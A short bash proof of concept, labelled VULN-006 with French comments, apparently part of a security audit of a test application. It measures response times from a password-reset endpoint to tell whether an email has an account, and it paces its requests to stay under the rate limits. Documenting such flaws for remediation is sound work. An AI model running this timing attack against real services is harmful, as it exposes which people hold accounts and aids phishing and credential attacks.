#!/usr/bin/env bash
# VULN-006 — PoC : savoir si un email a un compte grâce au temps de réponse de /auth/forgot-password
# La réponse est identique dans les deux cas, mais pas le temps de réponse.
# 7 requêtes au total : sous les limites (10 / 15 min / IP, 3 / heure / email).
export LC_NUMERIC=C   # point décimal pour printf, quelle que soit la langue du Mac
source "$(dirname "$0")/../outils/common.sh"
setup_accounts

measure() {
  local email=$1 total=0 t
  for i in 1 2 3; do
    read -r code t < <(post /auth/forgot-password "{\"email\":\"$email\"}" -o /dev/null -w '%{http_code} %{time_total}')
    printf "  %-22s HTTP %s  %s s\n" "$email" "$code" "$t"
    total=$(echo "$total + $t" | bc -l)
  done
  printf "  moyenne : %.3f s\n" "$(echo "$total / 3" | bc -l)"
}

echo "=== Réponse renvoyée (identique dans les deux cas) :"
post /auth/forgot-password '{"email":"ghost@corp.test"}'
echo
echo
echo "=== Email qui N'EXISTE PAS"
measure nobody@corp.test
echo
echo "=== Email qui EXISTE"
measure alice@corp.test
